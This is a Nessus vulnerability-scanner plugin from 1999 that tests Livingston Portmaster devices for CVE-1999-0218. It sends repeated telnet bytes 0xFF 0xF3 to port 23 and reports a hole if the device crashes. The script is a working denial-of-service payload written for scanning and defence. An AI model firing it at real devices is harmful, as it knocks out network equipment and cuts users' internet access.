#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10182);
 script_bugtraq_id(2225);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-1999-0218");
 name["english"] = "Livingston Portmaster crash";
 name["francais"] = "Crash de Livingston Portmaster";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote
Livingston portmaster by overflowing
its buffers by sending several times
the two chars :

	0xFF 0xF3


An attacker may use this flaw to prevent you
to use your internet access.

Solution : Contact your vendor for a patch.

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de tuer 
le Livingston Portmaster distant en 
dépassant ses buffers en lui envoyant
plusieurs fois les deux caractères :

	0xFF 0xF3
	
Un pirate peut utiliser ce problème pour
vous empecher d'avoir accès à internet.

Solution : Contactez votre vendeur pour un
patch.

Facteur de risque : Elevé.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote portmaster";
 summary["francais"] = "Plante le portmaster distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 script_require_ports(23);
 exit(0);
}

#
# The script code starts here
#


crp = raw_string(0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3);

port = 23;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  #
  # Send the crap ten times
  # 
  
  start_denial();
  send(socket:soc, data:crp, length:10) x 10;
  
  close(soc);
  
  alive = end_denial();
  
  if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
  }
}
